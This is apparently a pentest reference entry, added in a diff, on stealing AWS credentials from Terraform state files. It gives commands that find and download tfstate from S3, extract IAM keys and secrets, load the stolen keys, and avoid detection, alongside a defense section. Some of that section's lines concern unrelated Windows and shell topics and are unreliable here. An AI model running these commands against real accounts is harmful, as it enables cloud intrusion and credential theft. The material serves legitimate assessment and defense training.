@@ -1,0 +1,125 @@
+{
+  "id": "aws-terraform-state",
+  "name": "AWS - Terraform State File Credential Extraction",
+  "command": "aws --profile <profile> s3api list-buckets --query 'Buckets[?contains(Name, `tf-state`) || contains(Name, `terraform`)].Name'\naws --profile <profile> s3 cp s3://<tf-state-bucket>/terraform.tfstate ./\ncat terraform.tfstate | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(r) for r in str(d).split() if 'AKIA' in r or len(r)==40]\"",
+  "description": "Terraform stores infrastructure state in .tfstate files \u2014 often in S3 buckets named 'tf-state-*' or 'terraform-state-*'. These JSON files contain the complete current state of all provisioned resources, including plaintext IAM access keys and secrets for any IAM users created by Terraform. This is a high-value target: a single tfstate file can yield Administrator-level credentials that bypass the need for privilege escalation. Key fields: aws_iam_access_key resources contain access_key (AKID) and secret (secret access key).",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "s3:ListBucket",
+    "s3:GetObject"
+  ],
+  "tools": [
+    "awscli",
+    "python3",
+    "jq"
+  ],
+  "tags": [
+    "aws",
+    "cloud",
+    "terraform",
+    "credentials",
+    "iac",
+    "s3",
+    "post-exploitation"
+  ],
+  "category": "Credential Access",
+  "subcategory": "Cloud - AWS",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.10.6)",
+  "examples": [
+    {
+      "label": "List all S3 buckets and find Terraform state buckets",
+      "command": "aws --profile <profile> s3api list-buckets\n# Look for buckets named: tf-state-*, terraform-*, *-tfstate, *-state-*"
+    },
+    {
+      "label": "Filter bucket list for Terraform-related names",
+      "command": "aws --profile <profile> s3api list-buckets \\\n  --query 'Buckets[?contains(Name, `tf`) || contains(Name, `terraform`) || contains(Name, `state`)].Name'"
+    },
+    {
+      "label": "List contents of the Terraform state bucket",
+      "command": "aws --profile <profile> s3 ls s3://tf-state-123456789012/\n# May have: terraform.tfstate, terraform.tfstate.backup, workspace/default/terraform.tfstate"
+    },
+    {
+      "label": "Download the Terraform state file",
+      "command": "aws --profile <profile> s3 cp s3://tf-state-123456789012/terraform.tfstate ./"
+    },
+    {
+      "label": "Quick grep for AWS access key IDs",
+      "command": "grep -o 'AKIA[A-Z0-9]\\{16\\}' terraform.tfstate"
+    },
+    {
+      "label": "Extract all aws_iam_access_key resources from tfstate",
+      "command": "cat terraform.tfstate | python3 -c \"\nimport json, sys\nd = json.load(sys.stdin)\nfor res in d.get('resources', []):\n    if res.get('type') == 'aws_iam_access_key':\n        for inst in res.get('instances', []):\n            attrs = inst.get('attributes', {})\n            print(f'User: {attrs.get(\\\"user\\\")}')\n            print(f'AKI: {attrs.get(\\\"id\\\")}')\n            print(f'Secret: {attrs.get(\\\"secret\\\")}')\n            print()\n\""
+    },
+    {
+      "label": "jq - extract IAM access keys from tfstate",
+      "command": "jq '.resources[] | select(.type == \"aws_iam_access_key\") | .instances[].attributes | {user: .user, access_key: .id, secret: .secret}' terraform.tfstate"
+    },
+    {
+      "label": "jq - extract all sensitive attribute values",
+      "command": "jq '[.resources[].instances[].attributes | to_entries[] | select(.key | test(\"secret|password|key|token\"; \"i\")) | {(.key): .value}]' terraform.tfstate"
+    },
+    {
+      "label": "Configure profile with discovered credentials",
+      "command": "aws configure --profile tf-admin\n# Enter AKI and secret from tfstate\naws --profile tf-admin sts get-caller-identity\naws --profile tf-admin iam list-users"
+    }
+  ],
+  "notes": "Terraform tfstate is a JSON file with a 'resources' array. Each resource has a 'type' and 'instances' with 'attributes'. For aws_iam_access_key: 'id' = Access Key ID (AKIA...), 'secret' = Secret Access Key. For aws_db_instance (RDS): 'username' and 'password' are stored in plaintext. For aws_secretsmanager_secret_version: 'secret_string' stores the actual secret value. Terraform state files should never be stored unencrypted \u2014 misconfigured S3 buckets without SSE or bucket policies are a common finding. Terraform Cloud / Terraform Enterprise users store state remotely \u2014 check for .terraform/terraform.tfstate locally. Also check: DynamoDB tables used for Terraform state locking (named '*-terraform-lock' or '*-tfstate-lock') \u2014 these don't contain credentials but confirm Terraform is in use. AWS Organizations / multi-account setups may have separate tfstate per account/environment.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Attacking AWS Cloud Infrastructure",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Cloud Instance Metadata API",
+      "url": "https://attack.mitre.org/techniques/T1552/005/"
+    },
+    {
+      "title": "Terraform - Sensitive Data in State",
+      "url": "https://developer.hashicorp.com/terraform/language/state/sensitive-data"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-container-pivot",
+      "rel": "prereq",
+      "note": "Pivot into internal network to reach the S3 bucket containing tfstate."
+    },
+    {
+      "id": "aws-iam-scope-permissions",
+      "rel": "next",
+      "note": "Scope permissions of discovered terraform credentials before using them."
+    },
+    {
+      "id": "aws-iam-privesc-backdoor",
+      "rel": "alternative",
+      "note": "If tfstate contains an admin key, no need to create a backdoor user."
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1552.005",
+    "T1213.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Terraform state files (terraform.tfstate) contain the complete infrastructure inventory AND plaintext values of all Terraform-managed resources including: RDS passwords, IAM access keys, secret strings, TLS certificates, and SSH keys \u2014 whatever was defined as a Terraform output or resource attribute. State files stored in S3 are often world-readable or accessible to any IAM principal with S3 access. A single state file can expose credentials for the entire infrastructure.",
+    "prerequisites": "Access to S3 bucket where Terraform state is stored. aws s3 cp or GetObject permission on the state bucket. jq for parsing the JSON state file.",
+    "impact": "T1552.005 Unsecured Credentials + T1213.003 Data from Information Repositories. Single state file exposes all infrastructure secrets: database passwords, IAM keys, SSH keys, TLS certs. Enables immediate lateral movement to all Terraform-managed resources using extracted credentials.",
+    "detection": "S3 access logs: GetObject on terraform.tfstate or *.tfstate files from unexpected principals. CloudTrail: S3 GetObject for state files. GuardDuty: unusual access to state bucket.\nUnusual access to bash history, registry credential paths, or private key files by unauthorized or scripting tools (DET0412/AN1153).\nReading of sensitive files like .bash_history, /etc/shadow, or private key directories by unauthorized users (AN1154).\nUnusual access to ~/Library/Keychains, ~/.bash_history, or Terminal command history by unauthorized processes (AN1155).\nUnauthorized API or console calls to retrieve or reset password credentials, download key material, or modify SSO settings (AN1157).\nConfiguration backup utilities or CLI access dumping plaintext passwords, local user hashes, or SNMP strings (AN1159).",
+    "artifacts": "S3 access log: GetObject for .tfstate file | CloudTrail: unexpected principal accessing state bucket | Data: RDS passwords, IAM keys extracted from state JSON",
+    "prevention": "S3 bucket encryption with KMS customer-managed key. S3 bucket policy: restrict GetObject to only Terraform execution role (not broad developer access). Enable S3 versioning + MFA delete. Use Terraform Cloud or Atlantis with encrypted remote state (not raw S3 state). Never output sensitive values in Terraform outputs. Use aws_secretsmanager_secret for credentials instead of hardcoding in Terraform resources.\nActive Directory Configuration: Remove vulnerable Group Policy Preferences (patch KB2962486).\nAudit: Proactively search for files containing credentials; take remediation action when found.\nEncrypt Sensitive Information: Store keys on separate cryptographic hardware rather than local system.\nFilter Network Traffic: Limit access to Instance Metadata API; use WAF to prevent SSRF exploitation.\nOperating System Configuration: Disable/restrict NTLM; consider set +o history and ln -s /dev/null ~/.bash_history.\nPassword Policies: Use strong passphrases for private keys; prohibit password storage in files or Registry.\nPrivileged Account Management: Limit permissions on Registry-stored credentials to minimize abuse.\nRestrict File and Directory Permissions: Restrict file shares to specific directories with need-to-know access.\nUpdate Software: Apply KB2962486 to prevent credentials being stored in GPPs.",
+    "evasion": "Access state file directly via HTTP if bucket is public. Use legitimate IAM role with S3 access (e.g., developer role that legitimately has S3 access) \u2014 harder to distinguish from normal access.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1552/005/",
+      "https://attack.mitre.org/techniques/T1213/003/"
+    ],
+    "misconfiguration": "Terraform state S3 bucket accessible to all developers (not just CI/CD role). State bucket does not require encryption. No S3 access logging on state bucket. Terraform resources with plaintext sensitive values.",
+    "vulnerable_config": "# State bucket accessible to all developers:\naws s3api get-bucket-policy --bucket tf-state-bucket\n# \u2192 Principal: arn:aws:iam::ACCOUNT:role/developer (has GetObject)\n# \u2192 State file readable by all developer roles\n\n# Sensitive data in state:\naws s3 cp s3://tf-state-bucket/prod/terraform.tfstate - | \\\n  python3 -c 'import sys,json; s=json.load(sys.stdin); \\\n  [print(r[\"type\"],r.get(\"primary\",{}).get(\"attributes\",{})) for r in s.get(\"resources\",[])]'\n# \u2192 db_password: SuperSecret123 in plaintext",
+    "secure_config": "# Restrict state bucket to CI/CD role only:\n# S3 bucket policy:\n# {\n#   'Effect': 'Allow',\n#   'Principal': {'AWS': 'arn:aws:iam::ACCOUNT:role/TerraformExecution'},\n#   'Action': ['s3:GetObject', 's3:PutObject'],\n#   'Resource': 'arn:aws:s3:::tf-state-bucket/*'\n# }\n# Default: deny everyone else\n\n# Enable state encryption:\n# terraform backend config:\n# backend \"s3\" {\n#   bucket         = \"tf-state-bucket\"\n#   key            = \"prod/terraform.tfstate\"\n#   region         = \"us-east-1\"\n#   encrypt        = true\n#   kms_key_id     = \"arn:aws:kms:us-east-1:ACCOUNT:key/KEY_ID\"\n# }\n\n# Use Secrets Manager \u2014 don't embed in Terraform:\n# data \"aws_secretsmanager_secret_version\" \"db_pass\" {\n#   secret_id = \"prod/rds/password\"\n# }"
+  }
+}
